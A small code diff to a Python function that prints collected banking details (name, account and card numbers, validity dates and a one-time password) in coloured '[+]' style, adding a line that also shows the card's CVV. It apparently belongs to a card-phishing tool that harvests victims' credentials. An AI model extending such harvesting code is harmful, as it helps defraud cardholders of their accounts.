@@ -29,6 +29,7 @@ def print_data():
     print(f"{green} [{red}+{green}] {red}Your Name{red}: {green}{data_info.get('Name', 'N/A')}")
     print(f"{green} [{red}+{green}] {red}Account Number{red}: {green}{data_info.get('Account Number', 'N/A')}")
     print(f"{green} [{red}+{green}] {red}Card Number{red}: {green}{data_info.get('Card Number', 'N/A')}")
+    print(f"{green} [{red}+{green}] {red}CVV{red}: {green}{data_info.get('CVV', 'N/A')}")  # Added CVV
     print(f"{green} [{red}+{green}] {red}Valid From{red}: {green}{data_info.get('Valid From', 'N/A')}")
     print(f"{green} [{red}+{green}] {red}Valid Upto{red}: {green}{data_info.get('Valid Upto', 'N/A')}")
     print(f"{green} [{red}+{green}] {red}OTP is{red}: {green}{otp_info.get('OTP', 'N/A')}")
